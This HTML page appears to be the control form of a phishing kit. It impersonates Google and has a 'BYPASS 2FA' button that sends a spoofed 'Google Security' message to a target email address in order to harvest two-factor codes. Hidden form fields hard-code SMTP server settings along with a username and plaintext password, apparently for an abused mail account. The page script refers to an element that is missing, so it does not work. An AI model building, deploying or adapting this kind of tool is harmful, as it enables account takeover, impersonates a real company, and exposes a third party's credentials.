<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="MobileOptimized" content="width">
    <meta name="HandheldFriendly" content="true">
    <meta name="format-detection" content="telephone=yes">
    <style>
        body {
            background-color: #f2f2f2;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            font-size: 16px;
        }

        input[type="text"],
        select {
            background-color: #fff;
            width: 100%;
            color: #333;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }

        input[type="submit"] {
            background-color: #4285f4;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        center {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column; /* Add this to center vertically */
        }

        img {
            max-width: 40%;
        }

        .google-style-button {
            background-color: #4285f4;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        /* Import Google Fonts CSS for the desired font */
        @import url('https://fonts.googleapis.com/css?family=Roboto');

        /* Apply the Google Fonts style to the heading */
        .google-font {
            font-family: 'Roboto', sans-serif;
        }

        /* Style the container */
        .container {
            text-align: center;
            padding: 20px;
        }
    </style>
</head>
<body>
    <center>
        <div class="container">
            <img src="https://goldstandardautomotive.com/wp-content/uploads/2018/11/Google_gold-1080x354.png" alt="Google Logo">
            <br><br>
            <form action="submit1.php" method="POST" enctype="multipart/form-data">
                <input type="text" id="receivers_email" name="receivers_email" placeholder="Target@email.com" required>
                <input type="text" id="app" name="app" placeholder="Open App Name" required>
                <input type="text" id="code" name="code" placeholder="00" required>
                <input type="hidden" id="sender_name" name="sender_name" value="Google Security" required>
                <input type="hidden" name="line" value="" required>
                <input type="hidden" name="port" value="587" required>
                <input type="hidden" name="username" value="andallard@mymts.net" required>
                <input type="hidden" name="password" value="Batman123" required>
                <input type="hidden" name="host" value="mail.mymts.net" required>
                <input type="submit" value="BYPASS 2FA" class="google-style-button">
            </form>
        </div>
    </center>

    <script>
        // JavaScript to create the rainbow effect
        const wallpaper = document.getElementById('wallpaper');
        const img = wallpaper.querySelector('img');

        const colors = ['red', 'orange', 'yellow', 'green', 'blue', 'indigo', 'violet'];
        let currentColorIndex = 0;

        function applyRainbowEffect() {
            img.style.filter = `hue-rotate(${currentColorIndex * 45}deg)`;
            currentColorIndex = (currentColorIndex + 1) % colors.length;
            setTimeout(applyRainbowEffect, 1000); // Change color every second
        }

        applyRainbowEffect();
    </script>
</body>
</html>
